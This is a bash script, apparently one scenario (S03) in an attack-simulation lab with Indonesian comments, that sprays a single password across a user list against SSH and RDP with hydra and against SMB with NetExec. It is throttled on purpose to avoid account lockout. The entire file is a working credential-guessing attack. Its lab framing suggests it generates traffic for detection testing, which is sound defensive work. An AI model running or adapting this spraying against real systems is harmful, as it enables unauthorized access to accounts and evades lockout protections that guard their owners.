#!/usr/bin/env bash
# S03 — Password spraying (low-and-slow): 1 password, banyak user.
# Kategori: Brute Force (low-and-slow). Linux: SSH srv-file. Windows: SMB+RDP win.
SCN=S03; ATTACK_CAT="Brute Force"; PHASE=linux-or-windows
HERE="$(cd "$(dirname "$0")" && pwd)"; . "$HERE/../_lib/common.sh"
need_tool hydra
banner

SPRAY_PASS="${1:-P@ssw0rd123}"   # 1 password untuk semua user (argumen opsional)
echo "Spray password: $SPRAY_PASS  (-t 1 -W 5 = lambat, hindari lockout)"

mark_start "spray"
# --- Linux (selalu bisa): SSH srv-file ---
if ping -c1 -W2 "$SRV_FILE" >/dev/null 2>&1; then
  echo "== spray SSH $SRV_FILE =="
  hydra -L "$USERLIST" -p "$SPRAY_PASS" -t 1 -W 5 -o "$HERE/s03-ssh.hydra" ssh://"$SRV_FILE" || true
fi
# --- Windows phase: SMB + RDP ke win-client ---
if ping -c1 -W2 "$WIN" >/dev/null 2>&1; then
  settle 5
  echo "== spray SMB $WIN =="
  need_tool nxc
  nxc smb "$WIN" -u "$USERLIST" -p "$SPRAY_PASS" --continue-on-success | tee "$HERE/s03-smb.nxc" || true
  settle 5
  echo "== spray RDP $WIN =="
  hydra -L "$USERLIST" -p "$SPRAY_PASS" -t 1 -W 5 -o "$HERE/s03-rdp.hydra" rdp://"$WIN" || true
fi
mark_end "spray"
echo "Output: s03-ssh.hydra (+ s03-smb.nxc, s03-rdp.hydra jika Windows phase)"
